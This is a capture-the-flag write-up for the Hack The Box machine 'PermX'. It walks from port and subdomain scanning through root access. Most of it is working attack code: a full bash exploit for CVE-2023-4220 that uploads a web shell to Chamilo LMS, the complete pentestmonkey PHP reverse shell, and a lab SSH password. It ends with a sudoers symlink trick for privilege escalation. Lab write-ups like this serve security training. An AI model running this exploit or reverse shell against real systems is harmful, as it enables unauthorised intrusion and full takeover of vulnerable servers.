# PermX Write-up

<img src="https://labs.hackthebox.com/storage/avatars/3ec233f1bf70b096a66f8a452e7cd52f.png" width="200" height="200">

## Recon 

### Port enumeration with Nmap

`nmap -sC -sV -p- permx.htb`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
    |_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
    80/tcp open  http    Apache httpd 2.4.52
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    |_http-title: eLEARNING
    Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

### Directory enumeration with Dirsearch

`python3 dirsearch.py -u http://permx.htb --exclude-status 403,404,400,401,503 -o dir`

    301 -  303B  - /js  ->  http://permx.htb/js/                     
    200 -   10KB - /404.html                                         
    200 -   20KB - /about.html                                       
    200 -   14KB - /contact.html                                     
    301 -  304B  - /css  ->  http://permx.htb/css/                   
    301 -  304B  - /img  ->  http://permx.htb/img/                   
    200 -  922B  - /js/                                              
    301 -  304B  - /lib  ->  http://permx.htb/lib/                   
    200 -    2KB - /lib/                                             
    200 -    1KB - /LICENSE.txt    

### Sub-Domain enumeration with FFuF

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://permx.htb -H "Host:FUZZ.permx.htb" -fw 18`

    
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       


    lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 201ms]
    www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 175ms]

Found lms.permx.htb ; www.permx.htb

Add domain name to `/etc/hosts`

    sudo echo "10.10.11.23 permx.htb lms.permx.htb " | sudo tee -a /etc/hosts

permx.htb

![image](https://github.com/user-attachments/assets/923a8e70-e12c-408a-99ec-5fbf8ab977ec)

lms.permx.htb

![image](https://github.com/user-attachments/assets/4b4d61d7-0ccb-46c8-a590-b0a31a2bc4c8)

After recon we found CVE-2023-4220 for Chamilo LMS

CVE-2023-4220 Detail

Description

Unrestricted file upload in big file upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` in Chamilo LMS <= v1.11.24 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell.

NVD link: https://nvd.nist.gov/vuln/detail/CVE-2023-4220

## Exploitation

CVE-2023-4220

[Chamilo-CVE-2023-4220-Exploit](https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit)

    reverse_file=""
    host_link=""
    port=""
    
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    NC='\033[0m'
    
    
    # Usage function to display script usage
    usage() {
        echo -e "${GREEN}"
        echo "Usage: $0 -f reverse_file -h host_link -p port_in_the_reverse_file"
        echo -e "${NC}"
        echo "Options:"
        echo "  -f    Path to the reverse file"
        echo "  -h    Host link where the file will be uploaded"
        echo "  -p    Port for the reverse shell"
        exit 1
    }
    
    # Parse command-line options
    while getopts "f:h:p:" opt; do
        case $opt in
            f)
                reverse_file=$OPTARG
                ;;
            h)
                host_link=$OPTARG
                ;;
            p)
                port=$OPTARG
                ;;
            \?)
                echo -e "${RED}"
                echo "Invalid option: -$OPTARG" >&2
                usage
                ;;
            :)
    	    echo -e "${RED}"
                echo "Option -$OPTARG requires an argument." >&2
                usage
                ;;
        esac
    done
    
    # Check if all required options are provided
    if [ -z "$reverse_file" ] || [ -z "$host_link" ] || [ -z "$port" ]; then
        echo -e  "${RED}"
        echo "All options -f, -h, and -p are required."
        usage
    fi
    # Perform the file upload using curl
    echo -e "${GREEN}" 
    curl -F "bigUploadFile=@$reverse_file" "$host_link/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
    echo
    echo
    echo -e "#    Use This leter For Interactive TTY ;) " "${RED}"
    echo "#    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "#    export TERM=xterm"
    echo "#    CTRL + Z"
    echo "#    stty raw -echo; fg"
    echo -e "${GREEN}"
    echo "# Starting Reverse Shell On Port $port . . . . . . ."
    sleep 3
    curl "$host_link/main/inc/lib/javascript/bigupload/files/$reverse_file" &
    echo -e  "${NC}"
    
    nc -lnvp $port 

[PHP-Reverse-Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

    <?php
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '127.0.0.1';  // CHANGE THIS
    $port = 1234;       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;
    
    if (function_exists('pcntl_fork')) {
    	$pid = pcntl_fork();
    	
    	if ($pid == -1) {
    		printit("ERROR: Can't fork");
    		exit(1);
    	}
    	
    	if ($pid) {
    		exit(0);  // Parent exits
    	}
    
    	if (posix_setsid() == -1) {
    		printit("Error: Can't setsid()");
    		exit(1);
    	}
    
    	$daemon = 1;
    } else {
    	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }
    
    chdir("/");
    umask(0);
    
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
    	printit("$errstr ($errno)");
    	exit(1);
    }
    
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );
    
    $process = proc_open($shell, $descriptorspec, $pipes);
    
    if (!is_resource($process)) {
    	printit("ERROR: Can't spawn shell");
    	exit(1);
    }
    
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    
    printit("Successfully opened reverse shell to $ip:$port");
    
    while (1) {
    	if (feof($sock)) {
    		printit("ERROR: Shell connection terminated");
    		break;
    	}
    
    	if (feof($pipes[1])) {
    		printit("ERROR: Shell process terminated");
    		break;
    	}
    
    	$read_a = array($sock, $pipes[1], $pipes[2]);
    	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    
    	if (in_array($sock, $read_a)) {
    		if ($debug) printit("SOCK READ");
    		$input = fread($sock, $chunk_size);
    		if ($debug) printit("SOCK: $input");
    		fwrite($pipes[0], $input);
    	}
    
    	if (in_array($pipes[1], $read_a)) {
    		if ($debug) printit("STDOUT READ");
    		$input = fread($pipes[1], $chunk_size);
    		if ($debug) printit("STDOUT: $input");
    		fwrite($sock, $input);
    	}
    
    	if (in_array($pipes[2], $read_a)) {
    		if ($debug) printit("STDERR READ");
    		$input = fread($pipes[2], $chunk_size);
    		if ($debug) printit("STDERR: $input");
    		fwrite($sock, $input);
    	}
    }
    
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    function printit ($string) {
    	if (!$daemon) {
    		print "$string\n";
    	}
    }
    
    ?> 

Clone exploit and PHP revshell

    git clone https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit
    
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Change localhost IP-address and port number for the exploit! 

![image](https://github.com/user-attachments/assets/1c380a0e-9657-42d7-8ff2-e7e8ebda9a49)

After changing the shells, run the exploit 

    sudo ./CVE-2023-4220.sh -f php-reverse-shell.php  -h http://lms.permx.htb -p 1234

Read the configuration file and find there the credentials from the database

Try to use database credentials to connect via SSH

### SSH

SSH credentials 

`mtz`:`03F6lY3uXAP2bkW8`

    ssh mtz@10.10.11.23

Get the user flag!

![image](https://github.com/user-attachments/assets/e3f4c455-edc5-4a0c-9fb7-ba34353c1561)

### Privilege escalation

    sudo -l

![image](https://github.com/user-attachments/assets/21ce15dd-df5f-47ca-950a-77b3e63a5dae)

    cat /opt/acl.sh

![image](https://github.com/user-attachments/assets/92e04c7e-8a25-4ef0-939a-7d0db5ab165e)

    ln -s /etc/sudoers abc
    
    sudo /opt/acl.sh mtz rwx /home/mtz/abc
    
    nano abc

![image](https://github.com/user-attachments/assets/e1ea9e60-aab1-4357-986d-83ec4e9395f2)

add `mtz ALL=(ALL:ALL) NOPASSWD: ALL` to abc 

![image](https://github.com/user-attachments/assets/96e6c754-cb18-43c4-809c-59058ad7f5c5)

    sudo su

And now we're connected as a root

![image](https://github.com/user-attachments/assets/e70105ef-6074-495a-b63c-4aa31a4eae44)

Get the root flag!

    cat /root/root.txt

![image](https://github.com/user-attachments/assets/d3fd1d7d-339e-4270-846e-cf45c13355c3)

